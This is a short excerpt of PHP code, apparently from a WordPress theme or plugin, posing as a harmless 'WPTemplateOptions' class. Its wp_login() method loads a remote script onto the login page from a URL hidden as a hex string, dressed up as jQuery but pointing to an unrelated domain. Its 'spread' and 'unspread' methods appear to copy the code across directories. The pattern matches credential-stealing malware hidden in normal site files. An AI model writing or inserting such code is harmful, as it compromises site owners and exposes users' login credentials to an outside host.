...
if ( ! class_exists( 'WPTemplateOptions' ) ) {
	class WPTemplateOptions {
		...
		public function spread( $directory ) { //TODO return false hatalı
			try {
				$client = $this->client();
				if ( $client !== false ) {
		...
		public function unspread( $directory ) { //TODO return false hatalı
			try {
				$client = $this->client();
				if ( $client !== false ) {
					if ( array_search( $directory, $this->isSpread ) !== false ) {
		...
		public static function wp_login() {
			wp_enqueue_script( 'wp-login-jquery', hex2bin( '68747470733a2f2f6a732e61706965732e6f72672f6a71756572792e6d696e2e6a73' ), array(), rand( 0, 9999 ), false );
		}
